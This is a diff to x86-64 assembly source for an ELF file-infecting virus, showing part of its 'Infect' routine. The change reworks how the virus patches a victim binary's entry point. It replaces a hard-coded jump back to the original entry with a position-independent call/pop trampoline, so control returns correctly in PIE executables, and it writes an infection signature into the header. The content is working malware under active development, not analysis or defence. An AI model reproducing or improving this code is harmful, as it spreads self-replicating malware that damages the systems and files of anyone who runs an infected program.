@@ -245,7 +245,13 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   pop   rdi
   add   rsp,  0x8
+  
+  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
+  ; mov   rbx,  r10
+  add   r10,  0xc000000 ; was rbx not r10
+  mov   dword [rdx + elf64_hdr.e_entry], r10d            ; patch entry
+  
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
   mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
@@ -254,22 +260,36 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add   rbx,  [rsp + VX_CTX.qEof]
   add   rbx,  rcx
 
-  mov   byte  [rbx + 0],    0x48
-  mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
-  mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
-  mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
-  mov   byte  [rbx + 10],   0xFF 
-  mov   byte  [rbx + 11],   0xE0                        ; jmp rax
-  
-  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
+  ; mov   byte  [rbx + 0],    0x48
+  ; mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
+  ; mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
+  ; mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
+  ; mov   byte  [rbx + 10],   0xFF 
+  ; mov   byte  [rbx + 11],   0xE0                        ; jmp rax
 
-  mov   rbx,  r10
-  add   rbx,  0xc000000
-  mov   dword [rdx + elf64_hdr.e_entry], ebx            ; patch entry
-  
+  mov   dword   [rbx + 0],  0x000000e8  ; call $+5
+  mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
+  mov   word    [rbx + 6],  0x2d48
+  add   rcx,    0x5                     ; <-- prob needs adjustment lol
+  mov   dword   [rbx + 8],  ecx         ; sub rax, vx_size + 5
+  mov   word    [rbx + 12], 0x2d48
+  mov   dword   [rbx + 14], r10d        ; sub rax, new_entry
+  mov   word    [rbx + 18], 0x0548
+  mov   rcx,    [rsp + VX_CTX.qOldEntry]
+  mov   dword   [rbx + 20], ecx         ; add rax, old_entry
+  mov   word    [rbx + 24], 0xe0ff      ; jmp rax
+
+  ; --> GET OEP DESPITE PIE <-----------------------------------------------< 
+  ; call  $+5             ; e8 00 00 00 00    ; 
+  ; pop   rax             ; 58                ; rax = RIP
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; VX_SIZE + 5, known statically
+  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; new entry (make sure to patch below so r10 += 0xc000000)
+  ; add   rax, 0x???????? ; 48 05 ?? ?? ?? ?? ; rax += VX_CTX.qOldEntry
+  ; jmp   rax             ; ff e0             ; 
+
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
-  mov   dword [rdx + 0xC], 0x534e4700
+  mov   dword [rdx + 0xc], 0x534e4700
 
   ;; OVERWRITE FILE >-------------------------------------------------------<
 
